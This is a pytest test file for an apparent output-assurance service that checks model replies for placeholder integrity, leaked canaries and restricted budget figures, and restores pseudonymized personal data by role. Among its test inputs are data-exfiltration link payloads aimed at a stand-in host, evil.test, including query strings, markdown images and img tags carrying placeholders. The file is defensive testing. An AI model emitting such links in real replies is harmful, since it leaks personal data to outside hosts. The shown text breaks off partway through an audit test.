"""WP3 output assurance: placeholder integrity, leak blocking, role+purpose-scoped local rehydration.

The headline guarantees, each proven below:
  * an altered or invented placeholder is NEVER restored (exact-match only; a ~700-case mutation sweep);
  * an unauthorized role, wrong purpose, other tenant or unknown session gets no originals;
  * the canary and RESTRICTED values never reach user-visible output, however they are disguised;
  * the text that is returned is the text that was re-scanned, which also catches planted leaks and values
    that only become restricted when two innocent restorations sit side by side;
  * no network code, every decision audited (codes and counts only), advisory flags never act as a boundary."""
from __future__ import annotations

import ast
import json
import re
import socket
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path
from types import SimpleNamespace

import pytest
from conftest import auth
from fastapi import FastAPI
from fastapi.testclient import TestClient
from sqlalchemy import func, select
from privacy_fixtures import make_docx, para
from privacy_fixtures import run as docx_run
from vault_helpers import CANARY, ORIGINALS, QUOTE_TEXT, TENANT, fake_artifact, make_artifact, plant_entry, vault, wipe_vault

import app.assurance.check as check_mod
import app.assurance.routes as routes_mod
import app.bootstrap as bootstrap
from app import security
from app.assurance import router
from app.assurance.check import DEFAULT_TOXICITY_LEXICON, MAX_REPLY_CHARS, ToxicityLexicon, check_response
from app.audit import event_to_dict, verify_chain
from app.db import SessionLocal, session_scope
from app.models import AuditEvent
from app.privacy.detectors import TOKEN_RE
from app.privacy.pipeline import protect_document
from app.privacy.vault import DEFAULT_PURPOSE, VAULT_SECRET_ENV, VaultSessionInfo, open_context
from app.privacy.vault_models import VaultEntry, VaultSession

PO, FM, JC, SA = "procurement_officer", "finance_manager", "junior_clerk", "security_analyst"
REPLY = "Please contact [PERSON_01] at [EMAIL_01] about the quote from [ORG_01]."
EXPECTED = "Please contact Ayesha Khan at ayesha.khan@northbridge.example about the quote from Northbridge University."
ALT_SECRET = "another-high-entropy-secret-for-tests-0002-xxxx"


@pytest.fixture(autouse=True)
def _clean_vault():
    wipe_vault()
    yield
    wipe_vault()


USERS = {  # the seeded demo identities (app.seed.USERS): username -> (user id, role)
    "ayesha.po": ("u-po-01", PO), "bilal.clerk": ("u-jc-01", JC), "fatima.fm": ("u-fm-01", FM),
    "sana.sa": ("u-sa-01", SA), "zara.po": ("u-po-x1", PO),  # zara belongs to another tenant (southfield-lab)
}


@pytest.fixture(scope="module")
def api():
    """The assurance router on a local app, on the real seeded database (identities, audit chain).

    Seeded once per module: reseeding hashes six passwords with scrypt, which dominates the run time. Tokens
    are minted with the app's own issue_token; current_identity still re-reads user and role from the
    database on every request, so this exercises the same path as a login."""
    bootstrap.reset_demo()
    app = FastAPI()
    app.include_router(router)
    with TestClient(app) as c:
        yield SimpleNamespace(c=c, tok={name: security.issue_token(SimpleNamespace(id=uid, role=role))
                                        for name, (uid, role) in USERS.items()})


def post(api, body: dict, who: str = "ayesha.po"):
    return api.c.post("/api/assurance/check", json=body, headers=auth(api.tok[who]))


def raw_post(api, content, who: str = "ayesha.po"):
    return api.c.post("/api/assurance/check", content=content,
                      headers={**auth(api.tok[who]), "content-type": "application/json"})


def run(reply: str, info: VaultSessionInfo | None, *, role: str = PO, purpose: str = DEFAULT_PURPOSE, **kw):
    """check_response against a real stored session (no HTTP)."""
    with SessionLocal() as db:
        ctx = open_context(db, tenant_id=TENANT, session_id=info.session_id) if info is not None else None
        return check_response(reply, ctx=ctx, role=role, purpose=purpose, **kw)


def assert_no_originals(text: str) -> None:
    for value in ORIGINALS.values():
        assert value not in text


def assert_no_canary(text: str) -> None:
    squashed = re.sub(r"[^a-z0-9]", "", text.lower())
    assert "labcanary" not in squashed and "7731" not in squashed


# ------------------------------------------------------------------ contract
def test_the_router_exposes_one_post_route(api):
    routes = [r for r in router.routes if r.path == "/api/assurance/check"]
    assert len(routes) == 1 and routes[0].methods == {"POST"}
    assert api.c.get("/api/assurance/check", headers=auth(api.tok["ayesha.po"])).status_code == 405
    schema = api.c.get("/openapi.json").json()["paths"]["/api/assurance/check"]["post"]
    assert "response" in schema["requestBody"]["content"]["application/json"]["schema"]["properties"]


def test_authentication_is_required(api):
    assert api.c.post("/api/assurance/check", json={"response": "x"}).status_code == 401
    r = api.c.post("/api/assurance/check", json={"response": "x"}, headers={"Authorization": "Bearer nonsense"})
    assert r.status_code == 401


def test_the_response_has_the_shape_the_ui_expects(api):
    info = vault(make_artifact())
    r = post(api, {"response": REPLY, "session_id": info.session_id})
    assert r.status_code == 200
    body = r.json()
    assert {"placeholder_integrity", "leaks", "flags", "rehydrated"} <= set(body)
    assert body["placeholder_integrity"]["ok"] is True
    assert body["leaks"] == [] and body["flags"] == [] and body["rehydrated"] == EXPECTED
    assert body["blocked"] is False
    assert body["assurance"]["enforced"] == ["placeholder_integrity", "leaks", "rehydration"]
    assert body["assurance"]["advisory"] == ["flags"]


@pytest.mark.parametrize("extra", [{"role": FM}, {"rehydrate": True}, {"tenant_id": "x"}, {"user_id": "u-fm-01"}])
def test_role_and_unknown_fields_in_the_body_are_rejected(api, extra):
    info = vault(make_artifact())
    r = post(api, {"response": REPLY, "session_id": info.session_id, **extra}, who="sana.sa")
    assert r.status_code == 422
    assert_no_originals(r.text)


def test_unusable_input_is_rejected(api):
    for body in ({"response": "x" * (MAX_REPLY_CHARS + 1)}, {"response": 123}, {}, {"response": "x", "session_id": "nope"},
                 {"response": "x", "purpose": "Bad Purpose"}, {"response": "x", "artifact_id": "bad id!"}):
        assert post(api, body).status_code == 422, body
    # a lone surrogate is valid JSON but not text that can be hashed or exported; malformed JSON and non-objects
    # are sent as raw bytes because the test client would refuse to encode (or would re-encode) them
    for content in (b'{"response": "lone surrogate \\ud800"}', b"not json", b"[1, 2]", b'"just a string"', b"\xff\xfe\x00"):
        r = raw_post(api, content)
        assert r.status_code == 422 and r.json()["detail"]["code"] in ("INVALID_REQUEST", "INVALID_JSON"), content


def test_validation_errors_never_echo_the_request(api):
    """FastAPI's stock 422 reflects the offending input; a rejected request carrying the canary must not."""
    hostile = [
        {"response": "x" * (MAX_REPLY_CHARS + 1) + CANARY},
        {"response": "ok", "session_id": CANARY},
        {"response": "ok", "purpose": CANARY},
        {"response": "ok", CANARY: "LAB-CANARY-7731"},  # an unknown field whose NAME is the canary
        {"response": 123, "artifact_id": "bad id " + CANARY},
    ]
    for body in hostile:
        r = post(api, body)
        assert r.status_code == 422 and r.json()["detail"]["code"] == "INVALID_REQUEST"
        assert_no_canary(r.text)
        assert "xxxxxxxxxx" not in r.text
        assert {e["field"] for e in r.json()["detail"]["errors"]} <= {"response", "session_id", "artifact_id",
                                                                     "purpose", "source_text", "(unknown)"}
    r = raw_post(api, b'{"response": "lone \\ud800 LAB-CANARY-7731"}')
    assert r.status_code == 422
    assert_no_canary(r.text)


def test_oversized_bodies_are_refused_before_they_are_parsed(api):
    too_big = b'{"response": "' + b"a" * (routes_mod.MAX_BODY_BYTES + 10) + b'"}'
    r = raw_post(api, too_big)  # declared length
    assert r.status_code == 413 and r.json()["detail"]["code"] == "REQUEST_TOO_LARGE"
    chunks = (too_big[i:i + 500_000] for i in range(0, len(too_big), 500_000))
    r = raw_post(api, chunks)  # no Content-Length: counted as it streams in
    assert r.status_code == 413
    assert api.c.post("/api/assurance/check", content=too_big).status_code == 401  # never read without a valid token


def test_the_role_comes_from_the_database_not_from_a_token_claim(api):
    info = vault(make_artifact())
    forged_hint = security.issue_token(SimpleNamespace(id="u-sa-01", role=FM))  # signed, sub = the analyst, hint = FM
    r = api.c.post("/api/assurance/check", json={"response": REPLY, "session_id": info.session_id},
                   headers=auth(forged_hint))
    assert r.status_code == 200 and r.json()["rehydrated"] is None
    assert r.json()["rehydration"]["scope"]["role"] == SA
    assert_no_originals(r.text)


# ------------------------------------------------------------------ rehydration: allowed
def test_an_authorized_role_gets_originals_back_locally(api):
    info = vault(make_artifact(), artifact_id="PD-ok")
    for ref in ({"session_id": info.session_id}, {"artifact_id": "PD-ok"},
                {"session_id": info.session_id, "artifact_id": "PD-ok"}):
        b = post(api, {"response": REPLY, **ref}).json()
        assert b["rehydrated"] == EXPECTED
        assert b["rehydration"] == {"applied": True, "restored": 3, "kept_pseudonymized": 0, "aborted": False,
                                    "reasons": {}, "scope": {"role": PO, "purpose": DEFAULT_PURPOSE}}


def test_repeated_adjacent_and_wrapped_placeholders_are_all_restored_in_one_pass(api):
    info = vault(make_artifact())
    reply = "[PERSON_01][PERSON_01] / ([ORG_01]) / **[ORG_01]**x[ORG_01] / [PERSON_01],"
    b = post(api, {"response": reply, "session_id": info.session_id}).json()
    assert b["rehydrated"] == ("Ayesha KhanAyesha Khan / (Northbridge University) / "
                               "**Northbridge University**xNorthbridge University / Ayesha Khan,")
    assert b["rehydration"]["restored"] == 6


def test_checking_never_modifies_the_vault(api):
    info = vault(make_artifact())
    with SessionLocal() as db:
        before = sorted((e.id, e.nonce, e.ciphertext) for e in db.execute(select(VaultEntry)).scalars())
        sessions_before = [(s.session_id, s.kdf_salt, s.issued_tokens) for s in db.execute(select(VaultSession)).scalars()]
    for reply in (REPLY, "[PERSON_09]", f"leak {CANARY}", "no placeholders"):
        assert post(api, {"response": reply, "session_id": info.session_id}).status_code == 200
    with SessionLocal() as db:
        assert sorted((e.id, e.nonce, e.ciphertext) for e in db.execute(select(VaultEntry)).scalars()) == before
        assert [(s.session_id, s.kdf_salt, s.issued_tokens) for s in db.execute(select(VaultSession)).scalars()] == sessions_before


def test_output_is_deterministic(api):
    info = vault(make_artifact())
    body = {"response": REPLY + " [PERSON_9] guaranteed idiot", "session_id": info.session_id}
    assert post(api, body).json() == post(api, body).json()


# ------------------------------------------------------------------ rehydration: not allowed
def test_an_unauthorized_role_gets_no_originals_back(api):
    info = vault(make_artifact(), grant_roles=[PO, SA])  # even asking for the analyst yields no ciphertext
    r = post(api, {"response": REPLY, "session_id": info.session_id}, who="sana.sa")
    b = r.json()
    assert r.status_code == 200 and b["rehydrated"] is None
    assert b["rehydration"]["restored"] == 0 and b["rehydration"]["reasons"] == {"NOT_AUTHORIZED": 3}
    assert b["placeholder_integrity"]["ok"] is True  # the reply is well-formed; the caller simply may not see more
    assert_no_originals(r.text)


def test_a_role_with_a_class_grant_but_no_entry_for_this_session_gets_nothing(api):
    info = vault(make_artifact())  # only the owner's role was granted at store time
    r = post(api, {"response": REPLY, "session_id": info.session_id}, who="fatima.fm")
    assert r.json()["rehydrated"] is None and r.json()["rehydration"]["reasons"] == {"NOT_AUTHORIZED": 3}
    assert_no_originals(r.text)


def test_partial_rehydration_keeps_unauthorized_classes_pseudonymized(api):
    info = vault(make_artifact(), grant_roles=[PO, JC])
    r = post(api, {"response": REPLY, "session_id": info.session_id}, who="bilal.clerk")
    b = r.json()
    assert b["rehydrated"] == "Please contact [PERSON_01] at [EMAIL_01] about the quote from Northbridge University."
    assert b["rehydration"]["restored"] == 1 and b["rehydration"]["kept_pseudonymized"] == 2
    assert b["rehydration"]["reasons"] == {"NOT_AUTHORIZED": 2}
    assert "Ayesha" not in r.text and "ayesha.khan" not in r.text


def test_purpose_scopes_restoration(api):
    info = vault(make_artifact(), purpose="quotation_review")
    sid = info.session_id
    assert post(api, {"response": REPLY, "session_id": sid}).json()["rehydrated"] is None  # default purpose
    r = post(api, {"response": REPLY, "session_id": sid, "purpose": "export_external"})
    assert r.json()["rehydrated"] is None and r.json()["rehydration"]["scope"]["purpose"] == "export_external"
    assert_no_originals(r.text)
    assert post(api, {"response": REPLY, "session_id": sid, "purpose": "quotation_review"}).json()["rehydrated"] == EXPECTED


def test_another_tenants_session_looks_exactly_like_an_unknown_one(api):
    info = vault(make_artifact(), artifact_id="PD-tenant")
    foreign = post(api, {"response": REPLY, "session_id": info.session_id}, who="zara.po")
    unknown = post(api, {"response": REPLY, "session_id": "VS-" + "0" * 32}, who="zara.po")
    by_artifact = post(api, {"response": REPLY, "artifact_id": "PD-tenant"}, who="zara.po")
    assert foreign.status_code == unknown.status_code == by_artifact.status_code == 404
    assert foreign.json() == unknown.json() == by_artifact.json()
    assert foreign.json()["detail"]["code"] == "VAULT_SESSION_NOT_FOUND"
    assert_no_originals(foreign.text)


def test_unknown_expired_and_inconsistent_session_references(api):
    assert post(api, {"response": REPLY, "session_id": "VS-" + "f" * 32}).status_code == 404
    assert post(api, {"response": REPLY, "artifact_id": "PD-none"}).status_code == 404
    a, b = vault(make_artifact(), artifact_id="PD-one"), vault(make_artifact(), artifact_id="PD-two")
    assert post(api, {"response": REPLY, "session_id": a.session_id, "artifact_id": "PD-two"}).status_code == 404
    old = datetime.now(timezone.utc).replace(tzinfo=None) - timedelta(days=2)
    expired = vault(make_artifact(), artifact_id="PD-expired", now=old)
    r = post(api, {"response": REPLY, "session_id": expired.session_id})
    assert r.status_code == 410 and r.json()["detail"]["code"] == "VAULT_SESSION_EXPIRED"
    assert_no_originals(r.text)
    assert b.session_id != a.session_id


def test_without_a_session_nothing_is_restored_but_leaks_are_still_caught(api):
    b = post(api, {"response": REPLY}).json()  # exactly what the UI sends today
    assert b["rehydrated"] is None
    assert b["placeholder_integrity"]["ok"] is None and b["placeholder_integrity"]["status"] == "NO_SESSION_CONTEXT"
    assert sorted(b["placeholder_integrity"]["unverified"]) == ["[EMAIL_01]", "[ORG_01]", "[PERSON_01]"]
    assert b["rehydration"]["reasons"] == {"NO_SESSION_CONTEXT": 3}
    leak = post(api, {"response": f"{REPLY} {CANARY}"}).json()
    assert leak["blocked"] is True and leak["leaks"][0]["type"] == "CANARY"


# ------------------------------------------------------------------ fail closed: invented and altered placeholders
def test_a_placeholder_that_was_never_issued_is_not_restored(api):
    info = vault(make_artifact())
    reply = "[PERSON_01] met [PERSON_09] and [ORG_02]."
    r = post(api, {"response": reply, "session_id": info.session_id})
    b = r.json()
    assert b["rehydrated"] == "Ayesha Khan met [PERSON_09] and [ORG_02]."
    assert b["placeholder_integrity"]["ok"] is False and b["placeholder_integrity"]["status"] == "VIOLATIONS"
    assert b["placeholder_integrity"]["unexpected"] == ["[ORG_02]", "[PERSON_09]"]
    assert b["rehydration"]["reasons"] == {"NOT_ISSUED": 2}


ALTERED = [
    "[PERSON_1]", "[PERSON_001]", "[PERSON_02]", "[PERSON_99]", "[PERSONS_01]", "[person_01]", "[Person_01]",
    "[PERSON 01]", "[PERSON-01]", "[ PERSON_01 ]", "[PERSON_01 ]", "(PERSON_01)", "{PERSON_01}", "<PERSON_01>",
    "{{PERSON_01}}", "PERSON_01", "[PERSON_01a]", "[PERSON_01_]", "[ORG_01", "ORG_01]", "[REDACTED:PERSON]",
    "[REDACTED]", "[redacted]",
    "[PERSON_０１]",  # full-width digits
    "[PERSON_٠١]",  # Arabic-Indic digits
    "［PERSON_01］",  # full-width brackets
    "[PERSON​_01]", "[PER​SON_01]", "[PERSON_0​1]",  # zero-width characters
]


@pytest.mark.parametrize("variant", ALTERED)
def test_altered_placeholders_are_flagged_and_never_restored(api, variant):
    info = vault(make_artifact())
    r = post(api, {"response": f"Hello {variant} bye", "session_id": info.session_id})
    b = r.json()
    assert b["rehydrated"] is None and b["rehydration"]["restored"] == 0
    integrity = b["placeholder_integrity"]
    assert integrity["ok"] is False, variant
    assert integrity["unexpected"] or integrity["malformed"]
    assert_no_originals(r.text)


def _single_edit_mutations(token: str) -> list[str]:
    alphabet = "0123456789 _[]()PERSONperson-:​０١а"
    out = set()
    for i in range(len(token)):
        out.add(token[:i] + token[i + 1:])
        out.update(token[:i] + ch + token[i + 1:] for ch in alphabet if ch != token[i])
    for i in range(len(token) + 1):
        out.update(token[:i] + ch + token[i:] for ch in alphabet)
    out.discard(token)
    return sorted(out)


def test_there_is_no_fuzzy_matching_anywhere_restoration_happens_only_for_exact_tokens():
    info = vault(make_artifact())
    mutations = _single_edit_mutations("[PERSON_01]")
    assert len(mutations) > 600
    restored_somewhere = 0
    for mutation in mutations:
        reply = f"x {mutation} y"
        res = run(reply, info)
        exact = reply.count("[PERSON_01]")  # inserting a character AROUND an intact token leaves it intact
        assert res.rehydration["restored"] == exact, repr(mutation)
        if exact == 0:
            assert res.rehydrated is None and "Ayesha" not in json.dumps(res.to_response()), repr(mutation)
        else:
            restored_somewhere += 1
            assert res.rehydrated == reply.replace("[PERSON_01]", "Ayesha Khan")
    assert restored_somewhere > 0  # control: intact tokens inside a mutated string still restore
    assert run("x [PERSON_01] y", info).rehydrated == "x Ayesha Khan y"


def test_tokens_are_scoped_to_their_own_session():
    a = vault(make_artifact("Contact Ayesha Khan about it."), artifact_id="PD-sc-a")
    b = vault(make_artifact("Contact Bilal Ahmed about Northbridge University."), artifact_id="PD-sc-b")
    reply = "[PERSON_01] / [ORG_01]"
    ra, rb = run(reply, a), run(reply, b)
    assert ra.rehydrated == "Ayesha Khan / [ORG_01]"  # session A never issued [ORG_01]
    assert ra.placeholder_integrity["unexpected"] == ["[ORG_01]"] and ra.placeholder_integrity["ok"] is False
    assert rb.rehydrated == "Bilal Ahmed / Northbridge University"  # numbering restarts per document: no mix-up
    assert rb.placeholder_integrity["ok"] is True


def test_integrity_reports_valid_dropped_and_redacted_placeholders():
    art = make_artifact("Approved ceiling: PKR 7,100,000. Contact Ayesha Khan, ayesha.khan@northbridge.example.", role=FM)
    info = vault(art, role=FM, user="u-fm-01")
    res = run("Contact [PERSON_01]. The ceiling is [REDACTED:BUDGET_FIGURE].", info, role=FM)
    pi = res.placeholder_integrity
    assert pi["ok"] is True and pi["valid"] == ["[PERSON_01]", "[REDACTED:BUDGET_FIGURE]"] and pi["dropped"] == ["[EMAIL_01]"]
    assert res.rehydrated == "Contact Ayesha Khan. The ceiling is [REDACTED:BUDGET_FIGURE]."
    assert res.rehydration["reasons"] == {"IRREVERSIBLE": 1}  # a redaction keeps nothing to restore
    forged = run("The ceiling is [REDACTED:SALARY].", info, role=FM)
    assert forged.placeholder_integrity["unexpected"] == ["[REDACTED:SALARY]"] and forged.rehydrated is None


def test_diagnostic_lists_are_capped_and_never_crash():
    info = vault(make_artifact())
    reply = " ".join(f"[PERSON_{i:03d}] [x{i}]" for i in range(10, 300)) + " (PERSON_1) PERSON_2"
    res = run(reply, info)
    pi = res.placeholder_integrity
    assert len(pi["unexpected"]) == 25 and pi["unexpected_total"] == 290 and pi["ok"] is False
    assert pi["malformed_total"] >= 2


# ------------------------------------------------------------------ leaks
CANARY_VARIANTS = [
    "LAB-CANARY-7731", "lab-canary-7731", "Lab Canary 7731", "LAB_CANARY_7731", "LAB-CANARY",
    "LAB​-CANARY-7731", "LAB-CANARY-７７３１", "[LABCANARY_7731]", "[LAB-CANARY-7731]",
    "![x](https://e.test/LAB-CANARY-7731)", "```\nLAB-CANARY-7731\n```", "see (LAB_CANARY_7731), thanks",
]


@pytest.mark.parametrize("variant", CANARY_VARIANTS)
def test_the_canary_never_reaches_user_visible_output(api, variant):
    # (also: a blocked reply reports only the placeholder-shaped strings it contains, none if there are none)
    shaped = len(TOKEN_RE.findall(variant))
    assert run(f"just {variant}", vault(make_artifact())).rehydration["reasons"] == ({"BLOCKED": shaped} if shaped else {})
    info = vault(make_artifact())
    r = post(api, {"response": f"Summary for [PERSON_01]: {variant} end", "session_id": info.session_id})
    b = r.json()
    assert r.status_code == 200 and b["blocked"] is True and b["rehydrated"] is None
    assert b["rehydration"]["restored"] == 0 and b["rehydration"]["reasons"].get("BLOCKED", 0) >= 1
    assert any(lk["type"] == "CANARY" and lk["blocking"] and lk["severity"] == "CRITICAL" for lk in b["leaks"])
    assert_no_canary(r.text)  # not in the leak list, the integrity lists, the flags, nowhere
    assert_no_originals(r.text)  # a blocked reply restores nothing, not even the harmless placeholders


BUDGET_VARIANTS = [
    "The ceiling is PKR 6,950,000.", "approx 6.95 million in total", "figure 6950000", "PKR 6 950 000",
    "Approved budget of PKR 7,100,000 applies", "budget cap: Rs 7.1 million",
]


@pytest.mark.parametrize("variant", BUDGET_VARIANTS)
def test_restricted_budget_figures_block_the_reply(api, variant):
    info = vault(make_artifact())
    r = post(api, {"response": f"[PERSON_01] says: {variant}", "session_id": info.session_id})
    b = r.json()
    assert b["blocked"] is True and b["rehydrated"] is None
    assert any(lk["sensitivity"] == "RESTRICTED" and lk["blocking"] for lk in b["leaks"])
    assert "6,950,000" not in r.text and "6.95" not in r.text and "7,100,000" not in r.text
    assert_no_originals(r.text)


def test_a_sensitive_value_in_clear_is_reported_without_echoing_it_and_does_not_block(api):
    info = vault(make_artifact())
    reply = "Their address is ayesha.khan@northbridge.example. Contact [PERSON_01]."
    r = post(api, {"response": reply, "session_id": info.session_id})
    b = r.json()
    assert b["blocked"] is False and b["rehydrated"] == reply.replace("[PERSON_01]", "Ayesha Khan")
    (leak,) = b["leaks"]
    assert leak["type"] == "EMAIL" and leak["blocking"] is False and leak["severity"] == "HIGH"
    assert reply.index("ayesha") == leak["start"]
    assert "ayesha.khan" not in json.dumps(leak) and "ayesha.khan" not in json.dumps(b["placeholder_integrity"])


def test_diagnostics_never_echo_the_canary_or_originals(api):
    info = vault(make_artifact())
    replies = ["[LABCANARY_7731] [PERSON_01]", "[LAB-CANARY-7731] and (LAB_CANARY_7731) and [PERSON_1]",
               "[ORG_77] LAB-CANARY-7731", "[REDACTED:LAB_CANARY] [PERSON_01]", "PERSON_01 LAB_CANARY_7731 PERSON_01"]
    for reply in replies:
        r = post(api, {"response": reply, "session_id": info.session_id})
        assert r.status_code == 200
        assert_no_canary(r.text)
        assert_no_originals(r.text)


# ------------------------------------------------------------------ the re-scan
def test_a_poisoned_vault_entry_holding_the_canary_is_refused(api):
    info = vault(make_artifact(), artifact_id="PD-poison")
    plant_entry(info.session_id, "[ORG_01]", CANARY)  # authenticates fine: only screening can stop it
    r = post(api, {"response": "Supplier: [ORG_01]; contact [PERSON_01].", "session_id": info.session_id})
    b = r.json()
    assert b["rehydrated"] == "Supplier: [ORG_01]; contact Ayesha Khan."
    assert_no_canary(r.text)
    assert any(lk["stage"] == "vault_entry" and lk["sensitivity"] == "RESTRICTED" for lk in b["leaks"])
    assert b["rehydration"]["reasons"] == {"ENTRY_REJECTED": 1}


@pytest.mark.parametrize("parts,joined", [
    (("LAB-CAN", "ARY-7731"), CANARY),
    (("PKR 6,95", "0,000"), "PKR 6,950,000"),
    (("lab_", "canary 7731"), "lab_canary 7731"),
])
def test_the_rescan_catches_values_that_only_become_restricted_when_restored_side_by_side(api, parts, joined):
    art = fake_artifact("Parts: [ORG_01] and [ORG_02].", {"[ORG_01]": parts[0], "[ORG_02]": parts[1]})
    info = vault(art)  # each half is innocent alone, so the vault (rightly) accepts both
    r = post(api, {"response": "Joined: [ORG_01][ORG_02]", "session_id": info.session_id})
    b = r.json()
    assert b["rehydrated"] is None and b["rehydration"]["aborted"] is True and b["rehydration"]["restored"] == 0
    assert b["rehydration"]["reasons"] == {"RESCAN_BLOCKED": 1}
    assert any(lk["stage"] == "rehydrated" and lk["blocking"] for lk in b["leaks"])
    assert joined not in r.text and parts[0] not in r.text and parts[1] not in r.text
    assert_no_canary(r.text)
    # the same two placeholders far apart are fine: only the join is the problem
    far = post(api, {"response": "[ORG_01] ... and, much later, [ORG_02]", "session_id": info.session_id}).json()
    assert far["rehydrated"] == f"{parts[0]} ... and, much later, {parts[1]}"


def test_the_returned_text_is_exactly_the_text_that_was_rescanned(monkeypatch):
    scanned = []
    real_scan = check_mod._scan

    def spy(text, policy, stage):
        scanned.append((stage, text))
        return real_scan(text, policy, stage)

    monkeypatch.setattr(check_mod, "_scan", spy)
    res = run(REPLY, vault(make_artifact()))
    assert res.rehydrated == EXPECTED
    assert ("rehydrated", res.rehydrated) in scanned
    assert scanned.index(("model_reply", REPLY)) < scanned.index(("rehydrated", EXPECTED))  # reply first, result last


def test_restoring_can_never_create_or_expand_a_placeholder(monkeypatch):
    info = vault(make_artifact())
    plant_entry(info.session_id, "[PERSON_01]", "[ORG_01]")  # a value shaped like another placeholder
    refused = run("Hello [PERSON_01] and [ORG_01]", info)
    assert refused.rehydrated == "Hello [PERSON_01] and Northbridge University"  # no chaining: ORG restored once
    assert refused.rehydration["reasons"] == {"ENTRY_REJECTED": 1}
    monkeypatch.setattr(check_mod, "screen_original", lambda value, policy: None)  # even if screening were bypassed...
    aborted = run("Hello [PERSON_01]", info)
    assert aborted.rehydrated is None and aborted.rehydration["aborted"] is True  # ...the formation guard aborts
    assert aborted.rehydration["reasons"] == {"TOKEN_FORMATION": 1}


# ------------------------------------------------------------------ links
LINK_CASES = [
    "see https://evil.test/p?name=[PERSON_01] now",
    "![x](https://evil.test/i.png?e=[EMAIL_01])",
    '<img src="http://evil.test/[EMAIL_01].png">',
    "visit www.evil.test/[PERSON_01]",
    "mailto:[EMAIL_01]",
    "evil.test/path?q=[PERSON_01]",
    "[click](javascript:alert([PERSON_01]))",
    "<a href='http://evil.test/?q=[ORG_01]'>go</a>",
    "ｈｔｔｐｓ://evil.test/?q=[PERSON_01]",  # full-width scheme
]


@pytest.mark.parametrize("case", LINK_CASES)
def test_placeholders_inside_links_are_never_restored(api, case):
    info = vault(make_artifact())
    r = post(api, {"response": case, "session_id": info.session_id})
    b = r.json()
    assert b["rehydrated"] is None, case
    assert b["rehydration"]["reasons"].get("IN_LINK_CONTEXT", 0) >= 1
    assert "LINK_IN_OUTPUT" in {f["code"] for f in b["flags"]}
    assert_no_originals(r.text)


def test_the_same_placeholder_is_restored_outside_a_link_and_kept_inside_one(api):
    info = vault(make_artifact())
    reply = "Contact [PERSON_01] or open https://evil.test/?n=[PERSON_01] today."
    b = post(api, {"response": reply, "session_id": info.session_id}).json()
    assert b["rehydrated"] == "Contact Ayesha Khan or open https://evil.test/?n=[PERSON_01] today."
    assert b["rehydration"]["restored"] == 1 and b["rehydration"]["reasons"] == {"IN_LINK_CONTEXT": 1}


@pytest.mark.parametrize("label", ["Data:", "Tel:", "File:", "mailto:", "Note.", "e.g."])
def test_a_plain_label_before_a_placeholder_is_not_a_link(api, label):
    info = vault(make_artifact())
    b = post(api, {"response": f"{label} [PERSON_01]", "session_id": info.session_id}).json()
    assert b["rehydrated"] == f"{label} Ayesha Khan" and b["flags"] == []


# ------------------------------------------------------------------ advisory flags
def test_advisory_flags_never_block_or_change_restoration(api):
    info = vault(make_artifact())
    reply = "[PERSON_01] is an idiot and it is guaranteed, see [1]."
    b = post(api, {"response": reply, "session_id": info.session_id}).json()
    assert b["rehydrated"] == "Ayesha Khan is an idiot and it is guaranteed, see [1]."
    assert b["blocked"] is False and b["leaks"] == [] and b["placeholder_integrity"]["ok"] is True
    codes = [(f["code"], f.get("basis")) for f in b["flags"]]
    assert ("TOXICITY", None) in codes and ("UNGROUNDED_CLAIM", "unsupported-certainty") in codes
    assert ("UNGROUNDED_CLAIM", "unverifiable-citation") in codes
    assert all(f["advisory"] is True for f in b["flags"])
    (tox,) = [f for f in b["flags"] if f["code"] == "TOXICITY"]
    assert tox["categories"] == {"insult": 1} and "idiot" not in json.dumps(tox)  # categories and counts, no words


def test_the_toxicity_lexicon_is_configurable_and_never_a_boundary():
    info = vault(make_artifact())
    custom = ToxicityLexicon("test-lexicon-v1", {"rude": ("pineapple",)})
    res = run("[PERSON_01] said pineapple and kill you", info, lexicon=custom)
    (flag,) = [f for f in res.flags if f["code"] == "TOXICITY"]
    assert flag["categories"] == {"rude": 1} and flag["lexicon"] == "test-lexicon-v1"
    assert res.rehydrated == "Ayesha Khan said pineapple and kill you"
    assert any(f["code"] == "TOXICITY" for f in run("you idiot, I will hurt you", info).flags)
    assert "TOXICITY" not in {f["code"] for f in run("an idiotic plan", info).flags}  # whole words only
    assert DEFAULT_TOXICITY_LEXICON.version.startswith("aman-toxicity-lexicon")


def test_figures_and_references_missing_from_the_verified_safe_copy_are_flagged(api):
    art = make_artifact()
    info = vault(art, artifact_id="PD-ground")
    sid = info.session_id
    grounded = post(api, {"response": "QUOTE-101 totals PKR 7,280,000 (about 7.28 million); contact [PERSON_01].",
                          "session_id": sid, "source_text": art.text}).json()
    assert grounded["flags"] == [] and grounded["grounding"]["evaluated"] is True
    assert grounded["grounding"]["source_verified"] is True and grounded["grounding"]["figures_not_in_source"] == 0
    bad = post(api, {"response": "QUOTE-107 totals PKR 7,520,000 and 15% extra.", "session_id": sid,
                     "source_text": art.text}).json()
    (flag,) = bad["flags"]
    assert flag["code"] == "UNGROUNDED_CLAIM" and flag["basis"] == "not-in-source" and flag["advisory"] is True
    assert bad["grounding"]["figures_not_in_source"] == 3 and bad["grounding"]["references_not_in_source"] == 1
    assert "QUOTE-107" in flag["examples"]["references"] and "7520000" in flag["examples"]["figures"]
    assert bad["rehydrated"] is None and bad["blocked"] is False  # advisory: nothing blocked, nothing to restore here


def test_a_source_text_that_does_not_match_the_session_digest_is_ignored(api):
    info = vault(make_artifact())
    b = post(api, {"response": "QUOTE-999 costs PKR 1,234,567", "session_id": info.session_id,
                   "source_text": "some other document entirely"}).json()
    assert b["grounding"] == {"evaluated": False, "reason": "SOURCE_DIGEST_MISMATCH"} and b["flags"] == []
    none = post(api, {"response": "QUOTE-999 costs PKR 1,234,567", "session_id": info.session_id}).json()
    assert none["grounding"] == {"evaluated": False, "reason": "NO_SOURCE_TEXT"} and none["flags"] == []
    unverified = run("QUOTE-999", None, grounding_text="QUOTE-101")  # no session: usable, but labelled unverified
    assert unverified.grounding["evaluated"] is True and unverified.grounding["source_verified"] is False


def test_an_empty_reply_is_flagged_not_failed(api):
    b = post(api, {"response": ""}).json()
    assert [f["code"] for f in b["flags"]] == ["EMPTY_RESPONSE"] and b["rehydrated"] is None


# ------------------------------------------------------------------ operations
def test_each_check_is_audited_with_codes_and_counts_only(api):
    info = vault(make_artifact(), artifact_id="PD-audit")
    with session_scope() as s:
        baseline = s.execute(select(func.coalesce(func.max(AuditEvent.seq), 0))).scalar_one()
        gated_before = dict(s.execute(select(AuditEvent.decision, func.count(AuditEvent.seq))
                                      .where(AuditEvent.mode == "gated").group_by(AuditEvent.decision)).all())
